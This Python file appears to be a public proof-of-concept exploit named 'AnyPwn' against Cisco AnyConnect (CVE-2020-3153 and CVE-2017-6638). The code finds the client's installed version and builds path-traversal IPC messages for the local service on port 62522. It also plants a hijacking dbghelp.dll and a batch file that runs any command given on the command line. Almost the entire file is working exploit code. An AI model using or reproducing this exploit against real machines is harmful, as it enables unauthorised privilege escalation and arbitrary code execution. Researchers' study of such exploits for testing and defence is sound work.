# AnyPwn - Cisco AnyConnect (in)Secure Mobility Client PoC
# CVE-2020-3153 - Path Traversal & Dll Hijack

from dllhijack import plant
from cipc import CIPC_Message
import socket
import pathlib
import sys
import pefile

from loguru import logger as l
l.remove()
l.add(sys.stderr, level="DEBUG")


def discover_cisco_exe() -> dict:
    """ Discover vpndownloader.exe binary path and version """
    PATHS = [
        "C:/Program Files (x86)/Cisco/Cisco AnyConnect Secure Mobility Client",
        "C:/Program Files/Cisco/Cisco AnyConnect Secure Mobility Client",
    ]

    def __find_it() -> str:
        """ Determine vpndownloader.exe path"""
        for p in PATHS:
            exe_path = pathlib.Path(p + "/vpndownloader.exe")
            if exe_path.is_file():
                return str(exe_path)
        return ""

    def __get_version(filepath: str):
        """ Determine Cisco AnyConnect Secure Mobility Client version """
        pe = pefile.PE(filepath)
        verinfo = pe.VS_FIXEDFILEINFO[0]
        return (verinfo.FileVersionMS >> 16, verinfo.FileVersionMS & 0xFFFF, verinfo.FileVersionLS >> 16, verinfo.FileVersionLS & 0xFFFF)[:2]

    exe_path = __find_it()
    if exe_path == "":
        l.error("Couldn't find vpndownloader.exe binary, dirs:")
        for p in PATHS:
            l.error(f"- {p}")
        sys.exit(-1)
    pe_ver = __get_version(exe_path)
    l.info(f"Found: {exe_path}, ver: {pe_ver}")
    return {"path": exe_path, "ver": pe_ver}


def generate_cve_2017_6638(exe_path: str) -> bytes:
    l.warning("Attempting to exploit CVE-2017-6638")
    Cipc = CIPC_Message()
    Cipc.append(0, 2, f'"{exe_path}\t-"')
    Cipc.append(0, 6, f'{exe_path}')
    return Cipc.as_bytes()


def generate_cve_2020_3153(exe_path: str, require_ipcparam: bool) -> bytes:
    l.warning("Attempting to exploit CVE-2020-3153")
    exe_path = exe_path.replace("\\vpndownloader.exe", "")
    ipcparam = "-ipc=31337\t" if require_ipcparam else ""
    Cipc = CIPC_Message()
    Cipc.append(
        0, 2, f'"CAC-nc-install\t{ipcparam}{exe_path}\\a\\b\\c\\d\\./.././.././.././../vpndownloader.exe\t-"')
    Cipc.append(0, 6, f'{exe_path}\\vpndownloader.exe')
    return Cipc.as_bytes()


def generate_payload(exe: dict) -> bytes:
    """ Pick the best exploit for version specified """
    major, minor = exe['ver']
    if major == 4 and minor <=4:
        return generate_cve_2017_6638(exe['path'])
    elif major == 4 and minor <= 6:
        return generate_cve_2020_3153(exe['path'], False)
    elif major == 4 and minor <= 7: 
        return generate_cve_2020_3153(exe['path'], True)
    l.error("Couldn't find suitable exploit for this version. Not vulnerable?")
    sys.exit(-1)


def prepare_dll_hijack(exe: dict):
    """ Place dll and batch file within execution directory """
    major, minor = exe['ver']
    if major == 4 and minor < 5:
        payload_path = "C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Temp\\Downloader"
    else:
        payload_path = "C:\\ProgramData\\Cisco"
    cmd = " ".join(sys.argv[1:])
    l.info("Planting dbghelp.dll & payload.bat.")
    l.info(f"Command to run: {cmd}")
    plant(payload_path, cmd)


def send_payload(target: tuple, payload: bytes):
    """ Connect to IPC socket and send payload """
    l.info("Sending payload")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(target)
        l.debug(f"Connected to {target[0]}:{target[1]}")
        s.send(payload)
        # rcv = s.recv(2048)
    l.debug("Payload sent.")
    # l.debug("Received:")
    # l.debug(rcv)


def pwn():
    """ Discover AnyConnect version, prepare payload and pwn the machine """
    exe = discover_cisco_exe()
    payload = generate_payload(exe)
    l.debug("Payload generated:")
    l.debug(payload)
    if len(sys.argv) > 1:
        prepare_dll_hijack(exe)
    send_payload(("localhost", 62522), payload)
    l.info("Done.")


# pwn()

def fuzz():
    Cipc = CIPC_Message()
    Cipc.append(0, 2, f'"CAC-nc-install\t-ipc=31337\tC:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpndownloader.exe\t-"')
    Cipc.append(0, 6, f'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpndownloader.exe')
    payload = Cipc.as_bytes()
    send_payload(("localhost", 62522), payload)

fuzz()